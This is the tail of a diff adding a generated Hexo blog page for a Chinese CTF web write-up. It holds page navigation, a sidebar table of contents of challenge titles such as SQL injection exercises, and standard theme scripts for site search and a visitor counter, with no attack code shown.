+    <a href="http://chaosec.top/2018/06/10/实验吧web/" title="实验吧web">http://chaosec.top/2018/06/10/实验吧web/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/20/docker1/" rel="next" title="Docker简介与简单页面搭建">
+                <i class="fa fa-chevron-left"></i> Docker简介与简单页面搭建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/24/Train-my-pet/" rel="prev" title="萌宠养成记">
+                萌宠养成记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">新城瑞雪</p>
+              <p class="site-description motion-element" itemprop="description">相逢意气为君饮</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">30</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index-2.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/PPointCharles" title="GitHub &rarr; https://github.com/PPointCharles" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="mailto:1426594174@qq.com" title="E-Mail &rarr; mailto:1426594174@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+                </span>
+              
+            </div>
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"/></a>
+             </div>
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后台登录"><span class="nav-number">2.</span> <span class="nav-text"><a href="#&#x540E;&#x53F0;&#x767B;&#x5F55;" class="headerlink" title="&#x540E;&#x53F0;&#x767B;&#x5F55;"></a>&#x540E;&#x53F0;&#x767B;&#x5F55;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#加了料的报错注入"><span class="nav-number">3.</span> <span class="nav-text"><a href="#&#x52A0;&#x4E86;&#x6599;&#x7684;&#x62A5;&#x9519;&#x6CE8;&#x5165;" class="headerlink" title="&#x52A0;&#x4E86;&#x6599;&#x7684;&#x62A5;&#x9519;&#x6CE8;&#x5165;"></a>&#x52A0;&#x4E86;&#x6599;&#x7684;&#x62A5;&#x9519;&#x6CE8;&#x5165;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#认真一点！"><span class="nav-number">4.</span> <span class="nav-text"><a href="#&#x8BA4;&#x771F;&#x4E00;&#x70B9;&#xFF01;" class="headerlink" title="&#x8BA4;&#x771F;&#x4E00;&#x70B9;&#xFF01;"></a>&#x8BA4;&#x771F;&#x4E00;&#x70B9;&#xFF01;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSCTF-web200"><span class="nav-number">5.</span> <span class="nav-text"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#登录一下好吗"><span class="nav-number">6.</span> <span class="nav-text"><a href="#&#x767B;&#x5F55;&#x4E00;&#x4E0B;&#x597D;&#x5417;" class="headerlink" title="&#x767B;&#x5F55;&#x4E00;&#x4E0B;&#x597D;&#x5417;"></a>&#x767B;&#x5F55;&#x4E00;&#x4E0B;&#x597D;&#x5417;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#天下武功唯快不破"><span class="nav-number">7.</span> <span class="nav-text"><a href="#&#x5929;&#x4E0B;&#x6B66;&#x529F;&#x552F;&#x5FEB;&#x4E0D;&#x7834;" class="headerlink" title="&#x5929;&#x4E0B;&#x6B66;&#x529F;&#x552F;&#x5FEB;&#x4E0D;&#x7834;"></a>&#x5929;&#x4E0B;&#x6B66;&#x529F;&#x552F;&#x5FEB;&#x4E0D;&#x7834;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#让我进去"><span class="nav-number">8.</span> <span class="nav-text"><a href="#&#x8BA9;&#x6211;&#x8FDB;&#x53BB;" class="headerlink" title="&#x8BA9;&#x6211;&#x8FDB;&#x53BB;"></a>&#x8BA9;&#x6211;&#x8FDB;&#x53BB;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的SQL注入3"><span class="nav-number">9.</span> <span class="nav-text"><a href="#&#x7B80;&#x5355;&#x7684;SQL&#x6CE8;&#x5165;3" class="headerlink" title="&#x7B80;&#x5355;&#x7684;SQL&#x6CE8;&#x5165;3"></a>&#x7B80;&#x5355;&#x7684;SQL&#x6CE8;&#x5165;3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的SQL注入"><span class="nav-number">10.</span> <span class="nav-text"><a href="#&#x7B80;&#x5355;&#x7684;SQL&#x6CE8;&#x5165;" class="headerlink" title="&#x7B80;&#x5355;&#x7684;SQL&#x6CE8;&#x5165;"></a>&#x7B80;&#x5355;&#x7684;SQL&#x6CE8;&#x5165;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的SQL注入2"><span class="nav-number">11.</span> <span class="nav-text"><a href="#&#x7B80;&#x5355;&#x7684;SQL&#x6CE8;&#x5165;2" class="headerlink" title="&#x7B80;&#x5355;&#x7684;SQL&#x6CE8;&#x5165;2"></a>&#x7B80;&#x5355;&#x7684;SQL&#x6CE8;&#x5165;2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#这个看起来有点简单"><span class="nav-number">12.</span> <span class="nav-text"><a href="#&#x8FD9;&#x4E2A;&#x770B;&#x8D77;&#x6765;&#x6709;&#x70B9;&#x7B80;&#x5355;" class="headerlink" title="&#x8FD9;&#x4E2A;&#x770B;&#x8D77;&#x6765;&#x6709;&#x70B9;&#x7B80;&#x5355;"></a>&#x8FD9;&#x4E2A;&#x770B;&#x8D77;&#x6765;&#x6709;&#x70B9;&#x7B80;&#x5355;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#因缺思汀的绕过"><span class="nav-number">13.</span> <span class="nav-text"><a href="#&#x56E0;&#x7F3A;&#x601D;&#x6C40;&#x7684;&#x7ED5;&#x8FC7;" class="headerlink" title="&#x56E0;&#x7F3A;&#x601D;&#x6C40;&#x7684;&#x7ED5;&#x8FC7;"></a>&#x56E0;&#x7F3A;&#x601D;&#x6C40;&#x7684;&#x7ED5;&#x8FC7;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#天网管理系统"><span class="nav-number">14.</span> <span class="nav-text"><a href="#&#x5929;&#x7F51;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;" class="headerlink" title="&#x5929;&#x7F51;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;"></a>&#x5929;&#x7F51;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#拐弯抹角"><span class="nav-number">15.</span> <span class="nav-text"><a href="#&#x62D0;&#x5F2F;&#x62B9;&#x89D2;" class="headerlink" title="&#x62D0;&#x5F2F;&#x62B9;&#x89D2;"></a>&#x62D0;&#x5F2F;&#x62B9;&#x89D2;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Forms"><span class="nav-number">16.</span> <span class="nav-text"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#忘记密码了"><span class="nav-number">17.</span> <span class="nav-text"><a href="#&#x5FD8;&#x8BB0;&#x5BC6;&#x7801;&#x4E86;" class="headerlink" title="&#x5FD8;&#x8BB0;&#x5BC6;&#x7801;&#x4E86;"></a>&#x5FD8;&#x8BB0;&#x5BC6;&#x7801;&#x4E86;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#once-more"><span class="nav-number">18.</span> <span class="nav-text"><a href="#once-more" class="headerlink" title="once more"></a>once more</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Guess-next-session"><span class="nav-number">19.</span> <span class="nav-text"><a href="#Guess-next-session" class="headerlink" title="Guess next session"></a>Guess next session</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FALSE"><span class="nav-number">20.</span> <span class="nav-text"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#程序逻辑问题"><span class="nav-number">21.</span> <span class="nav-text"><a href="#&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x95EE;&#x9898;" class="headerlink" title="&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x95EE;&#x9898;"></a>&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x95EE;&#x9898;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP大法"><span class="nav-number">22.</span> <span class="nav-text"><a href="#PHP&#x5927;&#x6CD5;" class="headerlink" title="PHP&#x5927;&#x6CD5;"></a>PHP&#x5927;&#x6CD5;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#貌似有点难"><span class="nav-number">23.</span> <span class="nav-text"><a href="#&#x8C8C;&#x4F3C;&#x6709;&#x70B9;&#x96BE;" class="headerlink" title="&#x8C8C;&#x4F3C;&#x6709;&#x70B9;&#x96BE;"></a>&#x8C8C;&#x4F3C;&#x6709;&#x70B9;&#x96BE;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#看起来有点难"><span class="nav-number">24.</span> <span class="nav-text"><a href="#&#x770B;&#x8D77;&#x6765;&#x6709;&#x70B9;&#x96BE;" class="headerlink" title="&#x770B;&#x8D77;&#x6765;&#x6709;&#x70B9;&#x96BE;"></a>&#x770B;&#x8D77;&#x6765;&#x6709;&#x70B9;&#x96BE;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#猫抓老鼠"><span class="nav-number">25.</span> <span class="nav-text"><a href="#&#x732B;&#x6293;&#x8001;&#x9F20;" class="headerlink" title="&#x732B;&#x6293;&#x8001;&#x9F20;"></a>&#x732B;&#x6293;&#x8001;&#x9F20;</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#头有点大"><span class="nav-number">26.</span> <span class="nav-text"><a href="#&#x5934;&#x6709;&#x70B9;&#x5927;" class="headerlink" title="&#x5934;&#x6709;&#x70B9;&#x5927;"></a>&#x5934;&#x6709;&#x70B9;&#x5927;</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">新城瑞雪</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/three/three.min.js"></script>
+
+  
+  <script src="/lib/three/three-waves.min.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $('.leancloud_visitors');
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
+            Counter('put', '/classes/Counter/' + counter.objectId, JSON.stringify({ time: { '__op': 'Increment', 'amount': 1 } }))
+            
+              .done(function() {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.time + 1);
+              })
+            
+              .fail(function ({ responseJSON }) {
+                console.log(`Failed to save Visitor num, with error message: ${responseJSON.error}`);
+              })
+          } else {
+            
+              var $element = $(document.getElementById(url));
+              $element.find('.leancloud-visitors-count').text('Counter not initialized! More info at console err msg.');
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .fail(function ({ responseJSON }) {
+          console.log(`LeanCloud Counter Error: ${responseJSON.code} ${responseJSON.error}`);
+        });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + 'vSSOfqeDl62sLdrNdF2Kqigh-gzGzoHsz')
+        .done(function({ api_server }) {
+          var Counter = function(method, url, data) {
+            return $.ajax({
+              method: method,
+              url: 'https://' + api_server + '/1.1' + url,
+              headers: {
+                'X-LC-Id': 'vSSOfqeDl62sLdrNdF2Kqigh-gzGzoHsz',
+                'X-LC-Key': 'FKDjLVri4dF3W2GHPq9mP2WR',
+                'Content-Type': 'application/json',
+              },
+              data: data
+            });
+          };
+          
+            addCount(Counter);
+          
+        });
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
